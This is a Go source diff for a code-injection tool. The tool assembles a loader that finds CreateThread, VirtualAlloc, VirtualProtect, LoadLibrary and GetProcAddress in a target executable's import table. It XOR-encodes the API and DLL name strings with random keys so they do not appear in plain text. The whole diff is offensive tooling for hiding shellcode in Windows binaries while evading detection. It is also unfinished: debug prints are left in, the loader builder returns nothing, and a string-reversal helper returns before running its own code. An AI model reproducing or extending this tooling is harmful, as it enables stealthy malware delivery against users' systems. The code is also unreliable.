@@ -3,6 +3,7 @@ package injector
 import (
 	"bytes"
 	"embed"
+	"encoding/binary"
 	"encoding/hex"
 	"errors"
 	"fmt"
@@ -68,14 +69,14 @@ type loaderCtx struct {
 	LoadLibraryWOnly   bool
 
 	// encrypt the data in segments using xor
-	Kernel32DLLStr    []uint64
-	Kernel32DLLKey    []uint64
-	CreateThreadOff   []uint64
-	CreateThreadKey   []uint64
-	VirtualAllocOff   []uint64
-	VirtualAllocKey   []uint64
-	VirtualProtectOff []uint64
-	VirtualProtectKey []uint64
+	Kernel32DLL       []int64
+	Kernel32DLLKey    []int64
+	CreateThread      []int64
+	CreateThreadKey   []int64
+	VirtualAlloc      []int64
+	VirtualAllocKey   []int64
+	VirtualProtect    []int64
+	VirtualProtectKey []int64
 }
 
 func (inj *Injector) buildLoader() ([][]byte, error) {
@@ -103,21 +104,25 @@ func (inj *Injector) buildLoader() ([][]byte, error) {
 		RegV: inj.buildVolatileRegisterMap(),
 		RegS: inj.buildStableRegisterMap(),
 	}
-	err = inj.checkProcedureIsExist(ctx)
+	err = inj.checkProcIsExist(ctx)
 	if err != nil {
 		return nil, err
 	}
-
+	inj.buildProcNames(ctx)
+	// process loader template and assemble it
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
 	if err != nil {
 		return nil, fmt.Errorf("failed to build assembly source: %s", err)
 	}
+
+	fmt.Println(buf.String())
+
 	inst, err := inj.assemble(buf.String())
 	if err != nil {
 		return nil, err
 	}
-	fmt.Println(buf.String())
+
 	fmt.Println(len(inst))
 	fmt.Println(inst)
 	return nil, nil
@@ -193,7 +198,7 @@ func (inj *Injector) selectRegister() string {
 	return reg
 }
 
-func (inj *Injector) checkProcedureIsExist(ctx *loaderCtx) error {
+func (inj *Injector) checkProcIsExist(ctx *loaderCtx) error {
 	CreateThread := inj.getProcFromIAT("CreateThread")
 	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
 	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
@@ -214,13 +219,23 @@ func (inj *Injector) checkProcedureIsExist(ctx *loaderCtx) error {
 	if lackProcedure {
 		LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
 		LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
+		GetProcAddress := inj.getProcFromIAT("GetProcAddress")
 		if LoadLibraryA == nil && LoadLibraryW == nil {
 			return errors.New("LoadLibrary is not exist in IAT")
+		}
+		if GetProcAddress == nil {
+			return errors.New("GetProcAddress is not exist in IAT")
 		}
 		if LoadLibraryA == nil {
 			ctx.LoadLibraryWOnly = true
 		}
+		inj.procLoadLibraryA = LoadLibraryA
+		inj.procLoadLibraryW = LoadLibraryW
+		inj.procGetProcAddress = GetProcAddress
 	}
+	inj.procCreateThread = CreateThread
+	inj.procVirtualAlloc = VirtualAlloc
+	inj.procVirtualProtect = VirtualProtect
 	return nil
 }
 
@@ -231,6 +246,77 @@ func (inj *Injector) getProcFromIAT(proc string) *iat {
 		}
 	}
 	return nil
+}
+
+func (inj *Injector) buildProcNames(ctx *loaderCtx) {
+	isUTF16 := ctx.LoadLibraryWOnly
+	ctx.Kernel32DLL, ctx.Kernel32DLLKey = inj.buildProcName("kernel32.dll", isUTF16)
+	ctx.CreateThread, ctx.CreateThreadKey = inj.buildProcName("CreateThread", isUTF16)
+	ctx.VirtualAlloc, ctx.VirtualAllocKey = inj.buildProcName("VirtualAlloc", isUTF16)
+	ctx.VirtualProtect, ctx.VirtualProtectKey = inj.buildProcName("VirtualProtect", isUTF16)
+}
+
+func (inj *Injector) buildProcName(name string, isUTF16 bool) ([]int64, []int64) {
+	name += "\x00"
+	if isUTF16 {
+		name = toUTF16(name)
+	}
+	var (
+		val []int64
+		key []int64
+	)
+	switch inj.arch {
+	case "386":
+		// process alignment
+		num := len(name) % 4
+		if num != 0 {
+			num = 4 - num
+		}
+		name = reverseString(name + strings.Repeat("\x00", num))
+		for i := 0; i < len(name); i += 4 {
+			v := binary.LittleEndian.Uint32([]byte(name[i:]))
+			k := inj.rand.Uint32()
+			val = append(val, int64(v^k))
+			key = append(key, int64(k))
+		}
+	case "amd64":
+		// process alignment
+		num := len(name) % 8
+		if num != 0 {
+			num = 8 - num
+		}
+		name = reverseString(name + strings.Repeat("\x00", num))
+		for i := 0; i < len(name); i += 8 {
+			v := int64(binary.LittleEndian.Uint64([]byte(name[i:])))
+
+			fmt.Printf("%X\n", v)
+
+			k := inj.rand.Int63()
+			val = append(val, v^k)
+			key = append(key, k)
+		}
+	}
+	return val, key
+}
+
+func toUTF16(s string) string {
+	u := strings.Builder{}
+	u.Grow(len(s) * 2)
+	for _, r := range s {
+		u.WriteRune(r)
+		u.WriteByte(0x00)
+	}
+	return u.String()
+}
+
+func reverseString(s string) string {
+	return s
+	b := []byte(s)
+	n := len(b)
+	for i := 0; i < n/2; i++ {
+		b[i], b[n-1-i] = b[n-1-i], b[i]
+	}
+	return string(b)
 }
 
 func toDB(b []byte) string {
